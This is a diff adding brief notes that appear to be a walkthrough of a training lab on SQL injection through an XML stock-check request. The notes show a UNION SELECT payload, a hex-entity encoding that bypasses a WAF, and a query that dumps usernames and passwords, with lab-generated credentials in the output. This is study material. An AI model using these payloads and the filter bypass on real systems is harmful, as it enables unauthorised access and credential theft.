@@ -1,0 +1,33 @@
+SQL Injection with filter bypass via XML encoding
+Goal: Get Administrator password and login
+
+Analysis:
+
+1) Check for vulnerability
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1 UNION SELECT NULL</storeId></stockCheck>
+-> Detected by WAF
+
+-Right Click Payload
+-Extensions
+-Hackverter
+-Encode
+-Hex Entities
+
+<@hex_entities>1 UNION SELECT NULL<@/hex_entities>
+-> 
+573 units
+NULL
+
+2) Exfiltrate data
+<@hex_entities>1 UNION SELECT NULL, NULL<@/hex_entities>
+-> 
+0 units
+
+-> There must only be 1 column based on the output, so we need to concact
+
+1 UNION SELECT username || '~' || password FROM users
+->
+administrator~kq4iml3g3sgv0b2kq8eo
+573 units
+wiener~9zl0oz4zbij42phfy2cm
+carlos~cu4k3u41htuidzk3gjkt
